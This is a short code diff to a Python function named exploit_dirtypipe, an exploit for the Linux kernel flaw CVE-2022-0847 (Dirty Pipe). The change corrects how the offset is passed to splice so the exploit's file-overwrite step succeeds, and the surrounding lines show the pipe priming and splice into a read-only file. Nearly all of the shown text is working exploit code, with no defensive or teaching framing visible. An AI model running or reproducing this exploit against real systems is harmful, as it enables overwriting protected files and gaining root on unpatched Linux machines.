@@ -968,9 +968,11 @@ def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
             os.write(w, b"x")
             os.read(r, 1)
         fd = os.open(path, os.O_RDONLY)
-        # splice exactly 1 byte from (offset-1) into the pipe
+        # splice exactly 1 byte from (offset-1) into the pipe.
+        # off_in is loff_t* — pass byref, not a value (else EFAULT).
         SPLICE_F_MOVE = 1
-        n = libc.splice(fd, ctypes.c_int64(offset - 1), w, None, 1, SPLICE_F_MOVE)
+        off = ctypes.c_int64(offset - 1)
+        n = libc.splice(fd, ctypes.byref(off), w, None, 1, SPLICE_F_MOVE)
         if n != 1:
             os.close(fd); os.close(r); os.close(w)
             return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n}
